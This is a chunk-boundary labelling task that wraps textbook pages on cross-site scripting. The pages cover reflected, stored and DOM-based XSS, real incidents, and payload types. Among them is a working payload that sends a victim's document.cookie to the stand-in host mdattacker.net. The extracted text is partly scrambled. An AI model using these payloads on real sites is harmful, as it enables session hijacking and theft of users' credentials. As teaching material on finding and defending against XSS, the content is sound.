Below is a JSON array of document chunks, each with an "index" and "text".

★ **Task:** Return the **index of the FIRST CHUNK that begins the NEXT major section / heading / chapter / topic.**
That is, imagine the window as `[current‑section … | next‑section …]`; your answer is the index where the divider `|` sits.
⚠️ Do **NOT** return the index of the last chunk in the current section.
⚠️ Do **NOT** return the number of chunks.

Prefer to group *more* chunks rather than splitting on minor transitions (page numbers, pictures, charts etc.).
• A heading‑like chunk (ALL‑CAPS line, "Chapter …", numbered title) **does not by itself mark a boundary**. Treat the heading and its immediate introductory paragraph(s) as one unit. Only mark a boundary when the following chunk clearly shifts topic.

[BEGIN_EXAMPLES]
Example 1:
[
  {"index": 1, "text": "Copyright"},
  {"index": 2, "text": "Table of Contents"},
  {"index": 3, "text": "Preface"},
  {"index": 4, "text": "Chapter 1: Getting Started"},
  {"index": 5, "text": "Chapter 1 content…"}
]
✔ Correct response: **4**  (chunk 4 is the first of Chapter 1)

Example 2:
[
  {"index": 1, "text": "Chapter 1: The Basics"},
  {"index": 2, "text": "More on chapter 1"},
  {"index": 3, "text": "Still more on chapter 1"},
  {"index": 4, "text": "Chapter 2: Advanced Topics"},
  {"index": 5, "text": "Content on chapter 2"}
]
✔ Correct response: **4**

Example 3:
[
  {"index": 1, "text": "Section 2.4: Analysis of Results"},
  {"index": 2, "text": "Detailed explanation of the experimental setup …"},
  {"index": 3, "text": "Figure 2‑7: Distribution of sample values"},
  {"index": 4, "text": "Continuation of analysis and discussion …"},
  {"index": 5, "text": "Section 2.5: Limitations"}
]
✔ Correct response: **5**  (chunk 5 is the first chunk of the next real section; the figure caption at chunk 3 does **not** define a boundary)

✖ Wrong response : **3** (that is figure not a boundary)

Counter‑example (#4):
[
  {"index": 1, "text": "Chapter 1 intro"},
  {"index": 2, "text": "Chapter 1 body"},
  {"index": 3, "text": "Chapter 1 summary"},
  {"index": 4, "text": "Chapter 2: Advanced"},
  {"index": 5, "text": "Chapter 2 body"}
]
✔ Correct response: **4**
✖ Wrong response : **3** (that is the last chunk of Chapter 1, NOT the first of Chapter 2)

Counter‑example (#5 – heading travels with intro):
[
  {"index": 1, "text": "CHAPTER 2: INTRODUCTION"},
  {"index": 2, "text": "This chapter covers the basics of …"},
  {"index": 3, "text": "More details on the basics …"},
  {"index": 4, "text": "CHAPTER 3: ADVANCED TOPICS"}
]
✔ Correct response: **4**
✖ Wrong response : **2** or **3** (heading + intro are one unit)
[END_EXAMPLES]

Now decide the boundary for the real data below. Respond with a single integer from **1** to **21** — no explanation, no extra text.

[BEGIN_CHUNKS]
[
  {
    "index": 1,
    "text": "CHAPTER\n12\nAttacking Users:\nCross-Site Scripting\nAll the attacks we have considered so far involve directly targeting the server-\nside application. Many of these attacks do, of course, impinge upon other users,\nsuch as a SQL injection attack that steals other users’ data. But the attacker’s\nessential methodology was to interact with the server in unexpected ways to\nperform unauthorized actions and access unauthorized data.\nThe attacks described in this chapter and the next are in a different category,\nbecause the attacker’s primary target is the application’s other users. All the\nrelevant vulnerabilities still exist within the application itself. However, the\nattacker leverages some aspect of the application’s behavior to carry out malicious\nactions against another end user. These actions may result in some of the same\neffects that we have already examined, such as session hijacking, unauthor-\nized actions, and the disclosure of personal data. They may also result in other\nundesirable outcomes, such as logging of keystrokes or execution of arbitrary\ncommands on users’ computers.\nOther areas of software security have witnessed a gradual shift in focus from\nserver-side to client-side attacks in recent years. For example, Microsoft used\nto frequently announce serious security vulnerabilities within its server prod-\nucts. Although numerous client-side fl aws were also disclosed, these received\nmuch less attention because servers presented a much more appealing target\nfor most attackers. In the course of just a few years, at the start of the twenty-\nfi rst century, this situation has changed markedly. At the time of this writing,\n431\ncc1122..iinndddd 443311 88//1199//22001111 1122::1122::2255 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 432\n432 Chapter 12 n Attacking Users: Cross-Site Scripting\nno critical security vulnerabilities have been publicly announced in Microsoft’s\nIIS web server from version 6 onward. However, in the time since this product\nwas fi rst released, a large number of fl aws have been disclosed in Microsoft’s\nInternet Explorer browser. As general awareness of security threats has evolved,\nthe front line of the battle between application owners and hackers has moved\nfrom the server to the client.\nAlthough the development of web application security has been a few years\nbehind the curve, the same trend can be identifi ed. At the end of the 1990s, most\napplications on the Internet were riddled with critical fl aws such as command\ninjection, which could be easily found and exploited by any attacker with a bit\nof knowledge. Although many such vulnerabilities still exist today, they are\nslowly becoming less widespread and more diffi cult to exploit. Meanwhile, even\nthe most security-critical applications still contain many easily discoverable\nclient-side fl aws. Furthermore, although the server side of an application may\nbehave in a limited, controllable manner, clients may use any number of dif-\nferent browser technologies and versions, opening a wide range of potentially\nsuccessful attack vectors.\nA key focus of research in the past decade has been client-side vulnerabilities,\nwith defects such as session fi xation and cross-site request forgery fi rst being\ndiscussed many years after most categories of server-side bugs were widely\nknown. Media focus on web security is predominantly concerned with client-\nside attacks, with such terms as spyware, phishing, and Trojans being common\ncurrency to many journalists who have never heard of SQL injection or path\ntraversal. And attacks against web application users are an increasingly lucra-\ntive criminal business. Why go to the trouble of breaking into an Internet bank\nwhen you can instead compromise 1% of its 10 million customers in a relatively\ncrude attack that requires little skill or elegance?\nAttacks against other application users come in many forms and manifest a\nvariety of subtleties and nuances that are frequently overlooked. They are also\nless well understood in general than the primary server-side attacks, with dif-\nferent fl aws being confl ated or neglected even by some seasoned penetration\ntesters. We will describe all the different vulnerabilities that are commonly\nencountered and spell out the practical steps you need to follow to identify and\nexploit each of these.\nThis chapter focuses on cross-site scripting (XSS). This category of vulner-\nability is the Godfather of attacks against other users. It is by some measure the\nmost prevalent web application vulnerability found in the wild. It affl icts the\nvast majority of live applications, including some of the most security-critical\napplications on the Internet, such as those used by online banks. The next\nchapter examines a large number of other types of attacks against users, some\nof which have important similarities to XSS.\ncc1122..iinndddd 443322 88//1199//22001111 1122::1122::2266 PPMM"
  },
  {
    "index": 2,
    "text": "Stuttard c12.indd V2 - 08/10/2011 Page 433\nChapter 12 n Attacking Users: Cross-Site Scripting 433\n\nCOMMON MYTH\n“Users get compromised because they are not security-conscious”.\nAlthough this is partially true, some attacks against application users can\nbe successful regardless of the users’ security precautions. Stored XSS attacks\ncan compromise the most security-conscious users without any interaction\nfrom the user. Chapter 13 introduces many more methods by which security-\nconscious users can be compromised without their knowledge.\nWhen XSS was fi rst becoming widely known in the web application security\ncommunity, some professional penetration testers were inclined to regard XSS\nas a “lame” vulnerability. This was partly due to its phenomenal prevalence\nacross the web, and also because XSS is often of less direct use to a lone hacker\ntargeting an application, as compared with many vulnerabilities such as server-\nside command injection. Over time, this perception has changed, and today XSS\nis often cited as the number-one security threat on the web. As research into\nclient-side attacks has developed, discussion has focused on numerous other\nattacks that are at least as convoluted to exploit as any XSS fl aw. And numerous\nreal-world attacks have occurred in which XSS vulnerabilities have been used\nto compromise high-profi le organizations.\nXSS often represents a critical security weakness within an application. It\ncan often be combined with other vulnerabilities to devastating effect. In some\nsituations, an XSS attack can be turned into a virus or self-propagating worm.\nAttacks of this kind are certainly not lame."
  },
  {
    "index": 3,
    "text": "COMMON MYTH\n“You can’t own a web application via XSS.”\nThe authors have owned numerous applications using only XSS attacks. In\nthe right situation, a skillfully exploited XSS vulnerability can lead directly to a\ncomplete compromise of the application. We will show you how.\nVarieties of XSS\nXSS vulnerabilities come in various forms and may be divided into three vari-\neties: refl ected, stored, and DOM-based. Although these have several features\nin common, they also have important differences in how they can be identifi ed\nand exploited. We will examine each variety of XSS in turn.\ncc1122..iinndddd 443333 88//1199//22001111 1122::1122::2266 PPMM"
  },
  {
    "index": 4,
    "text": "Stuttard c12.indd V2 - 08/10/2011 Page 434\n434 Chapter 12 n Attacking Users: Cross-Site Scripting\nRefl ected XSS Vulnerabilities\nA very common example of XSS occurs when an application employs a dynamic\npage to display error messages to users. Typically, the page takes a parameter\ncontaining the message’s text and simply renders this text back to the user within\nits response. This type of mechanism is convenient for developers, because it\nallows them to invoke a customized error page from anywhere in the application\nwithout needing to hard-code individual messages within the error page itself.\nFor example, consider the following URL, which returns the error message\nshown in Figure 12-1:\nhttp://mdsec.net/error/5/Error.ashx?message=Sorry%2c+an+error+occurred\nFigure 12-1: A dynamically generated error message\nLooking at the HTML source for the returned page, we can see that the appli-\ncation simply copies the value of the message parameter in the URL and inserts\nit into the error page template at the appropriate place:\n<p>Sorry, an error occurred.</p>\nThis behavior of taking user-supplied input and inserting it into the HTML\nof the server’s response is one of the signatures of refl ected XSS vulnerabilities,\nand if no fi ltering or sanitization is being performed, the application is certainly\nvulnerable. Let’s see how.\nThe following URL has been crafted to replace the error message with a piece\nof JavaScript that generates a pop-up dialog:\nhttp://mdsec.net/error/5/Error.ashx?message=<script>alert(1)</script>\nRequesting this URL generates an HTML page that contains the following\nin place of the original message:\n<p><script>alert(1);</script></p>\ncc1122..iinndddd 443344 88//1199//22001111 1122::1122::2266 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 435\nChapter 12 n Attacking Users: Cross-Site Scripting 435\nSure enough, when the page is rendered within the user’s browser, the pop-\nup message appears, as shown in Figure 12-2.\nFigure 12-2: A proof-of-concept XSS exploit\nPerforming this simple test serves verifi es two important things. First, the\ncontents of the message parameter can be replaced with arbitrary data that gets\nreturned to the browser. Second, whatever processing the server-side application\nis performing on this data (if any), it is insuffi cient to prevent us from supply-\ning JavaScript code that is executed when the page is displayed in the browser.\nTRY IT!\nhttp://mdsec.net/error/5/\nNOTE If you try examples like this in Internet Explorer, the pop-up may fail to\nappear, and the browser may show the message “Internet Explorer has modi-\nfi ed this page to help prevent cross-site scripting.” This is because recent ver-\nsions of Internet Explorer contain a built-in mechanism designed to protect\nusers against refl ected XSS vulnerabilities. If you want to test these examples,\nyou can try a different browser that does not use this protection, or you can dis-\nÿ ÿ ÿ\nable the XSS fi lter by going to Tools Internet Options Security Custom\nLevel. Under Enable XSS fi lter, select Disable. We will describe how the XSS fi l-\nter works, and ways in which it can be circumvented, later in this chapter.\nThis type of simple XSS bug accounts for approximately 75% of the XSS\nvulnerabilities that exist in real-world web applications. It is called refl ected\nXSS because exploiting the vulnerability involves crafting a request containing\nembedded JavaScript that is refl ected to any user who makes the request. The\nattack payload is delivered and executed via a single request and response. For\nthis reason, it is also sometimes called fi rst-order XSS.\ncc1122..iinndddd 443355 88//1199//22001111 1122::1122::2266 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 436\n436 Chapter 12 n Attacking Users: Cross-Site Scripting\nExploiting the Vulnerability\nAs you will see, XSS vulnerabilities can be exploited in many different ways\nto attack other users of an application. One of the simplest attacks, and the one\nthat is most commonly envisaged to explain the potential signifi cance of XSS\nfl aws, results in the attacker’s capturing the session token of an authenticated\nuser. Hijacking the user’s session gives the attacker access to all the data and\nfunctionality to which the user is authorized (see Chapter 7).\nThe steps involved in this attack are illustrated in Figure 12-3.\nApplication\n3. U 1 s . e U r s r 4 e e . q r S u lo e e g a s r s v t t t s e a i n r a c t k r t e e a s r c ’ p k s o e J n r a ’ d s v s a\nU\nS w\nR\nc i\nL\nt r h ipt\n7.\nA ttacker\nhijacks user’s session\n5. Attacker’s\nJavaScript 2. Attacker feeds crafted URL to user\nexecutes in\n6. User’s browser sends session token to attacker\nuser’s browser\nUser Attacker\nFigure 12-3: The steps involved in a reflected XSS attack\n1. The user logs in to the application as normal and is issued a cookie\ncontaining a session token:\nSet-Cookie: sessId=184a9138ed37374201a4c9672362f12459c2a652491a3\n2. Through some means (described in detail later), the attacker feeds the\nfollowing URL to the user:\nhttp://mdsec.net/error/5/Error.ashx?message=<script>var+i=new+Image\n;+i.src=”http://mdattacker.net/”%2bdocument.cookie;</script>\nAs in the previous example, which generated a dialog message, this URL\ncontains embedded JavaScript. However, the attack payload in this case\nis more malicious.\n3. The user requests from the application the URL fed to him by the attacker.\ncc1122..iinndddd 443366 88//1199//22001111 1122::1122::2266 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 437\nChapter 12 n Attacking Users: Cross-Site Scripting 437\n4. The server responds to the user’s request. As a result of the XSS vulner-\nability, the response contains the JavaScript the attacker created.\n5. The user’s browser receives the attacker’s JavaScript and executes it in the\nsame way it does any other code it receives from the application.\n6. The malicious JavaScript created by the attacker is:\nvar i=new Image; i.src=”http://mdattacker.net/”+document.cookie;\nThis code causes the user’s browser to make a request to mdattacker.net\nwhich is a domain owned by the attacker. The request contains the user’s\ncurrent session token for the application:\nGET /sessId=184a9138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1\nHost: mdattacker.net\n7. The attacker monitors requests to mdattacker.net and receives the user’s\nrequest. He uses the captured token to hijack the user’s session, gaining\naccess to that user’s personal information and performing arbitrary actions\n“as” the user.\nNOTE As you saw in Chapter 6, some applications store a persistent cookie\nthat effectively reauthenticates the user on each visit, such as to implement a\n“remember me” function. In this situation, step 1 of the preceding process is\nunnecessary. The attack will succeed even when the target user is not actively\nlogged in to or using the application. Because of this, applications that use\ncookies in this way leave themselves more exposed in terms of the impact of\nany XSS fl aws they contain.\nAfter reading all this, you may be forgiven for wondering why, if the attacker\ncan induce the user to visit a URL of his choosing, he bothers with the rigma-\nrole of transmitting his malicious JavaScript via the XSS bug in the vulnerable\napplication. Why doesn’t he simply host a malicious script on mdattacker.net\nand feed the user a direct link to this script? Wouldn’t this script execute in the\nsame way as it does in the example described?\nTo understand why the attacker needs to exploit the XSS vulnerability, recall\nthe same-origin policy that was described in Chapter 3. Browsers segregate\ncontent that is received from different origins (domains) in an attempt to prevent\ndifferent domains from interfering with each other within a user’s browser.\nThe attacker’s objective is not simply to execute an arbitrary script but to cap-\nture the user’s session token. Browsers do not let just any old script access a\ndomain’s cookies; otherwise, session hijacking would be easy. Rather, cookies\ncan be accessed only by the domain that issued them. They are submitted in\nHTTP requests back to the issuing domain only, and they can be accessed via\ncc1122..iinndddd 443377 88//1199//22001111 1122::1122::2266 PPMM"
  },
  {
    "index": 5,
    "text": "Stuttard c12.indd V2 - 08/10/2011 Page 438\n438 Chapter 12 n Attacking Users: Cross-Site Scripting\nJavaScript contained within or loaded by a page returned by that domain only.\nHence, if a script residing on mdattacker.net queries document.cookie, it will\nnot obtain the cookies issued by mdsec.net, and the hijacking attack will fail.\nThe reason why the attack that exploits the XSS vulnerability is successful is\nthat, as far as the user’s browser is concerned, the attacker’s malicious JavaScript\nwas sent to it by mdsec.net. When the user requests the attacker’s URL, the\nbrowser makes a request to http://mdsec.net/error/5/Error.ashx , and the\napplication returns a page containing some JavaScript. As with any JavaScript\nreceived from mdsec.net, the browser executes this script within the security\ncontext of the user’s relationship with mdsec.net. This is why the attacker’s\nscript, although it actually originates elsewhere, can gain access to the cook-\nies issued by mdsec.net. This is also why the vulnerability itself has become\nknown as cross-sitescripting.\nStored XSS Vulnerabilities\nA different category of XSS vulnerability is often called stored cross-site scripting.\nThis version arises when data submitted by one user is stored in the application\n(typically in a back-end database) and then is displayed to other users without\nbeing fi ltered or sanitized appropriately.\nStored XSS vulnerabilities are common in applications that support interac-\ntion between end users, or where administrative staff access user records and\ndata within the same application. For example, consider an auction application\nthat allows buyers to post questions about specifi c items and sellers to post\nresponses. If a user can post a question containing embedded JavaScript, and\nthe application does not fi lter or sanitize this, an attacker can post a crafted\nquestion that causes arbitrary scripts to execute within the browser of anyone\nwho views the question, including both the seller and other potential buyers.\nIn this context, the attacker could potentially cause unwitting users to bid on\nan item without intending to, or cause a seller to close an auction and accept\nthe attacker’s low bid for an item.\nAttacks against stored XSS vulnerabilities typically involve at least two requests\nto the application. In the fi rst, the attacker posts some crafted data containing\nmalicious code that the application stores. In the second, a victim views a page\ncontaining the attacker’s data, and the malicious code is executed when the\nscript is executed in the victim’s browser. For this reason, the vulnerability is\nalso sometimes called second-order cross-site scripting. (In this instance, “XSS”\nis really a misnomer, because the attack has no cross-site element. The name is\nwidely used, however, so we will retain it here.)\nFigure 12-4 illustrates how an attacker can exploit a stored XSS vulnerability\nto perform the same session hijacking attack as was described for refl ected XSS.\ncc1122..iinndddd 443388 88//1199//22001111 1122::1122::2277 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 439\nChapter 12 n Attacking Users: Cross-Site Scripting 439\nApplication\n3. Us 2 e . r U v s i 4 e e . r w S l s o e g a a rv s t t t t e a a i r n c c k r k e e e s r r ’ ’ p s s o q J n a u d v e s a s S w tio c it r n h ipt 7. A tt c a o c n ke ta r 1 i n . h i A i n ja t g t c a k m c s k a e u li r s c e s io r u ’ u b s s m s J e i a t s s v s a q io S u\nn\nc e r s i t p io t n\n5. Attacker’s\nJavaScript\nexecutes in\n6. User’s browser sends session token to attacker\nuser’s browser\nUser Attacker\nFigure 12-4: The steps involved in a stored XSS attack\nTRY IT!\nThis example contains a search function that displays the query that the\ncurrent user enters, and also a list of recent queries by other users. Because\nqueries are displayed unmodifi ed, the application is vulnerable to both\nrefl ected and stored XSS. See if you can fi nd both vulnerabilities.\nhttp://mdsec.net/search/11/\nRefl ected and stored XSS have two important differences in the attack process.\nStored XSS generally is more serious from a security perspective.\nFirst, in the case of refl ected XSS, to exploit a vulnerability, the attacker must\ninduce victims to visit his crafted URL. In the case of stored XSS, this require-\nment is avoided. Having deployed his attack within the application, the attacker\nsimply needs to wait for victims to browse to the page or function that has been\ncompromised. Usually this is a regular page of the application that normal users\nwill access of their own accord.\nSecond, the attacker’s objectives in exploiting an XSS bug are usually achieved\nmuch more easily if the victim is using the application at the time of the attack.\nFor example, if the user has an existing session, this can be immediately hijacked.\nIn a refl ected XSS attack, the attacker may try to engineer this situation by\npersuading the user to log in and then click a link that he supplies. Or he may\nattempt to deploy a persistent payload that waits until the user logs in. However,\ncc1122..iinndddd 443399 88//1199//22001111 1122::1122::2277 PPMM"
  },
  {
    "index": 6,
    "text": "Stuttard c12.indd V2 - 08/10/2011 Page 440\n440 Chapter 12 n Attacking Users: Cross-Site Scripting\nin a stored XSS attack, it is usually guaranteed that victim users will already\nbe accessing the application at the time the attack strikes. Because the attack\npayload is stored within a page of the application that users access of their own\naccord, any victim of the attack will by defi nition be using the application at\nthe moment the payload executes. Furthermore, if the page concerned is within\nthe authenticated area of the application, any victim of the attack must also be\nlogged in at the time.\nThese differences between refl ected and stored XSS mean that stored XSS\nfl aws are often critical to an application’s security. In most cases, an attacker can\nsubmit some crafted data to the application and then wait for victims to be hit.\nIf one of those victims is an administrator, the attacker will have compromised\nthe entire application.\nDOM-Based XSS Vulnerabilities\nBoth refl ected and stored XSS vulnerabilities involve a specifi c pattern of behavior,\nin which the application takes user-controllable data and displays this back to\nusers in an unsafe way. A third category of XSS vulnerabilities does not share\nthis characteristic. Here, the process by which the attacker’s JavaScript gets\nexecuted is as follows:\nn A user requests a crafted URL supplied by the attacker and containing\nembedded JavaScript.\nn The server’s response does not contain the attacker’s script in any form.\nn When the user’s browser processes this response, the script is executed\nnonetheless.\nHow can this series of events occur? The answer is that client-side JavaScript\ncan access the browser’s document object model (DOM) and therefore can deter-\nmine the URL used to load the current page. A script issued by the application\nmay extract data from the URL, perform some processing on this data, and then\nuse it to dynamically update the page’s contents. When an application does this,\nit may be vulnerable to DOM-based XSS.\nRecall the original example of a refl ected XSS fl aw, in which the server-side\napplication copies data from a URL parameter into an error message. A differ-\nent way of implementing the same functionality would be for the application to\nreturn the same piece of static HTML on every occasion and to use client-side\nJavaScript to dynamically generate the message’s contents.\nFor example, suppose that the error page returned by the application contains\nthe following:\n<script>\nvar url = document.location;\ncc1122..iinndddd 444400 88//1199//22001111 1122::1122::2277 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 441\nChapter 12 n Attacking Users: Cross-Site Scripting 441\nurl = unescape(url);\nvar message = url.substring(url.indexOf(‘message=’) + 8, url\n.length);\ndocument.write(message);\n</script>\nThis script parses the URL to extract the value of the message parameter and\nsimply writes this value into the page’s HTML source code. When invoked as the\ndevelopers intended, it can be used in the same way as in the original example\nto create error messages easily. However, if an attacker crafts a URL containing\nJavaScript code as the value of the message parameter, this code will be dynami-\ncally written into the page and executed in the same way as if the server had\nreturned it. In this example, the same URL that exploited the original refl ected\nXSS vulnerability can also be used to produce a dialog box:\nhttp://mdsec.net/error/18/Error.ashx?message=<script>alert(‘xss’)</script>\nTRY IT!\nhttp://mdsec.net/error/18/\nFigure 12-5 illustrates the process of exploiting a DOM-based XSS\nvulnerability.\nApplication\n3. U 1 s . e U r s r 4 e e c . q r o S u l n e o e t r g s a v t s i e n s r i i n n a r t g e t s a h p c a o k r e n d r d - ’ c s s o U w d\nR\ni e t d h\nL\nJ p a a v g a e Script\n7.\nA ttacker\nhijacks user’s session\n5. Attacker’s\nURL is processed 2. Attacker feeds crafted URL to user\nby JavaScript,\n6. User’s browser sends session token to attacker\ntriggering his\nattack payload User Attacker\nFigure 12-5: The steps involved in a DOM-based XSS attack\ncc1122..iinndddd 444411 88//1199//22001111 1122::1122::2277 PPMM"
  },
  {
    "index": 7,
    "text": "Stuttard c12.indd V2 - 08/10/2011 Page 442\n442 Chapter 12 n Attacking Users: Cross-Site Scripting\nDOM-based XSS vulnerabilities are more similar to refl ected XSS bugs than\nto stored XSS bugs. Their exploitation typically involves an attacker’s inducing\na user to access a crafted URL containing malicious code. The server’s response\nto that specifi c request causes the malicious code to be executed. However,\nin terms of the exploitation details, there are important differences between\nrefl ected and DOM-based XSS, which we will examine shortly.\nXSS Attacks in Action\nTo understand the serious impact of XSS vulnerabilities, it is fruitful to examine\nsome real-world examples of XSS attacks. It also helps to consider the wide range\nof malicious actions that XSS exploits can perform and how they are actively\nbeing delivered to victims.\nReal-World XSS Attacks\nIn 2010, the Apache Foundation was compromised via a refl ected XSS attack\nwithin its issue-tracking application. An attacker posted a link, obscured using\na redirector service, to a URL that exploited the XSS fl aw to capture the session\ntoken of the logged-in user. When an administrator clicked the link, his ses-\nsion was compromised, and the attacker gained administrative access to the\napplication. The attacker then modifi ed a project’s settings to change the upload\nfolder for the project to an executable directory within the application’s web\nroot. He uploaded a Trojan login form to this folder and was able to capture\nthe usernames and passwords of privileged users. The attacker identifi ed some\npasswords that were being reused on other systems within the infrastructure.\nHe was able to fully compromise those other systems, escalating the attack\nbeyond the vulnerable web application.\nFor more details on this attack, see this URL:\nhttp://blogs.apache.org/infra/entry/apache_org_04_09_2010\nIn 2005, the social networking site MySpace was found to be vulnerable to a\nstored XSS attack. The MySpace application implements fi lters to prevent users\nfrom placing JavaScript into their user profi le page. However, a user called Samy\nfound a means of circumventing these fi lters and placed some JavaScript into\nhis profi le page. The script executed whenever a user viewed this profi le and\ncaused the victim’s browser to perform various actions with two key effects.\nFirst, the browser added Samy as a “friend” of the victim. Second, it copied the\nscript into the victim’s own user profi le page. Subsequently, anyone who viewed\nthe victim’s profi le would also fall victim to the attack. The result was an XSS-\nbased worm that spread exponentially. Within hours the original perpetrator\ncc1122..iinndddd 444422 88//1199//22001111 1122::1122::2277 PPMM"
  },
  {
    "index": 8,
    "text": "Stuttard c12.indd V2 - 08/10/2011 Page 443\nChapter 12 n Attacking Users: Cross-Site Scripting 443\nhad nearly one million friend requests. As a result, MySpace had to take the\napplication offl ine, remove the malicious script from the profi les of all its users,\nand fi x the defect in its anti-XSS fi lters.\nFor more details on this attack, see this URL:\nhttp://namb.la/popular/tech.html\nWeb mail applications are inherently at risk of stored XSS attacks because\nof how they render e-mail messages in-browser when viewed by the recipient.\nE-mails may contain HTML-formatted content, so the application effectively\ncopies third-party HTML into the pages it displays to users. In 2009, a web mail\nprovider called StrongWebmail offered a $10,000 reward to anyone who could\nbreak into the CEO’s e-mail. Hackers identifi ed a stored XSS vulnerability within\nthe web mail application that allowed arbitrary JavaScript to be executed when\nthe recipient viewed a malicious e-mail. They sent a suitable e-mail to the CEO,\ncompromised his session on the application, and claimed the reward.\nFor more details on this attack, see this URL:\nhttp://blogs.zdnet.com/security/?p=3514\nIn 2009, Twitter fell victim to two XSS worms that exploited stored XSS vulner-\nabilities to spread between users and post updates promoting the website of the\nworms’ author. Various DOM-based XSS vulnerabilities have also been identi-\nfi ed in Twitter, arising from its extensive use of Ajax-like code on the client side.\nFor more details on these vulnerabilities, see the following URLs:\nwww.cgisecurity.com/2009/04/two-xss-worms-slam-twitter.html\nhttp://blog.mindedsecurity.com/2010/09/twitter-domxss-wrong-fix-and-\nsomething.html\nPayloads for XSS Attacks\nSo far, we have focused on the classic XSS attack payload. It involves capturing\na victim’s session token, hijacking her session, and thereby making use of the\napplication “as” the victim, performing arbitrary actions and potentially taking\nownership of that user’s account. In fact, numerous other attack payloads may\nbe delivered via any type of XSS vulnerability.\nVirtual Defacement\nThis attack involves injecting malicious data into a page of a web application to\nfeed misleading information to users of the application. It may simply involve\ninjecting HTML markup into the site, or it may use scripts (sometimes hosted\non an external server) to inject elaborate content and navigation into the site.\ncc1122..iinndddd 444433 88//1199//22001111 1122::1122::2277 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 444\n444 Chapter 12 n Attacking Users: Cross-Site Scripting\nThis kind of attack is known as virtualdefacement because the actual content\nhosted on the target’s web server is not modifi ed. The defacement is generated\nsolely because of how the application processes and renders user-supplied input.\nIn addition to frivolous mischief, this kind of attack could be used for seri-\nous criminal purposes. A professionally crafted defacement, delivered to the\nright recipients in a convincing manner, could be picked up by the news media\nand have real-world effects on people’s behavior, stock prices, and so on, to the\nattacker’s fi nancial benefi t, as illustrated in Figure 12-6.\nFigure 12-6: A virtual defacement attack exploiting an XSS flaw\nInjecting Trojan Functionality\nThis attack goes beyond virtual defacement and injects actual working func-\ntionality into the vulnerable application. The intent is to deceive end users into\nperforming some undesirable action, such as entering sensitive data that is then\ntransmitted to the attacker.\nAs was described in the attack against Apache, an obvious attack involving\ninjected functionality is to present users with a Trojan login form that submits\ntheir credentials to a server controlled by the attacker. If skillfully executed,\nthe attack may also seamlessly log in the user to the real application so that she\ndoes not detect any anomaly in her experience. The attacker is then free to use\nthe victim’s credentials for his own purposes. This type of payload lends itself\nwell to a phishing-style attack, in which users are fed a crafted URL within the\nactual authentic application and are advised that they need to log in as normal\nto access it.\nAnother obvious attack is to ask users to enter their credit card details, usually\nwith the inducement of some attractive offer. For example, Figure 12-7 shows a\nproof-of-concept attack created by Jim Ley, exploiting a refl ected XSS vulner-\nability found in Google in 2004.\ncc1122..iinndddd 444444 88//1199//22001111 1122::1122::2277 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 445\nChapter 12 n Attacking Users: Cross-Site Scripting 445\nFigure 12-7: A reflected XSS attack injecting Trojan functionality\nThe URLs in these attacks point to the authentic domain name of the actual\napplication, with a valid SSL certifi cate where applicable. Therefore, they are\nfar more likely to persuade victims to submit sensitive information than pure\nphishing websites that are hosted on a different domain and merely clone the\ncontent of the targeted website.\nInducing User Actions\nIf an attacker hijacks a victim’s session, he can use the application “as” that\nuser and carry out any action on the user’s behalf. However, this approach to\nperforming arbitrary actions may not always be desirable. It requires that the\nattacker monitor his own server for submissions of captured session tokens from\ncompromised users. He also must carry out the relevant action on behalf of every\nuser. If many users are being attacked, this may be impractical. Furthermore,\nit leaves a rather unsubtle trace in any application logs, which could easily be\nused to identify the computer responsible for the unauthorized actions during\nan investigation.\ncc1122..iinndddd 444455 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 446\n446 Chapter 12 n Attacking Users: Cross-Site Scripting\nAn alternative to session hijacking, where an attacker simply wants to carry\nout a specifi c set of actions on behalf of each compromised user, is to use the\nattack payload script itself to perform the actions. This attack payload is par-\nticularly useful in cases where an attacker wants to perform some action that\nrequires administrative privileges, such as modifying the permissions assigned\nto an account he controls. With a large user base, it would be laborious to hijack\neach user’s session and establish whether the victim was an administrator. A\nmore effective approach is to induce every compromised user to attempt to\nupgrade the permissions on the attacker’s account. Most attempts will fail, but\nthe moment an administrative user is compromised, the attacker succeeds in\nescalating privileges. Ways of inducing actions on behalf of other users are\ndescribed in the “Request Forgery” section of Chapter 13.\nThe MySpace XSS worm described earlier is an example of this attack payload.\nIt illustrates the power of such an attack to perform unauthorized actions on\nbehalf of a mass user base with minimal effort by the attacker. This attack used\na complex series of requests using Ajax techniques (described in Chapter 3) to\ncarry out the various actions that were required to allow the worm to propagate.\nAn attacker whose primary target is the application itself, but who wants\nto remain as stealthy as possible, can leverage this type of XSS attack payload\nto cause other users to carry out malicious actions of his choosing against the\napplication. For example, the attacker could cause another user to exploit a SQL\ninjection vulnerability to add a new administrator to the table of user accounts\nwithin the database. The attacker would control the new account, but any inves-\ntigation of application logs may conclude that a different user was responsible.\nExploiting Any Trust Relationships\nYou have already seen one important trust relationship that XSS may exploit:\nbrowsers trust JavaScript received from a website with the cookies issued by\nthat website. Several other trust relationships can sometimes be exploited in\nan XSS attack:\nn If the application employs forms with autocomplete enabled, JavaScript\nissued by the application can capture any previously entered data that\nthe user’s browser has stored in the autocomplete cache. By instantiating\nthe relevant form, waiting for the browser to autocomplete its contents,\nand then querying the form fi eld values, the script may be able to steal\nthis data and transmit it to the attacker’s server. This attack can be more\npowerful than injecting Trojan functionality, because sensitive data can\nbe captured without requiring any interaction from the user.\nn Some web applications recommend or require that users add their domain\nname to their browser’s “Trusted Sites” zone. This is almost always unde-\nsirable and means that any XSS-type fl aw can be exploited to perform\ncc1122..iinndddd 444466 88//1199//22001111 1122::1122::2288 PPMM"
  },
  {
    "index": 9,
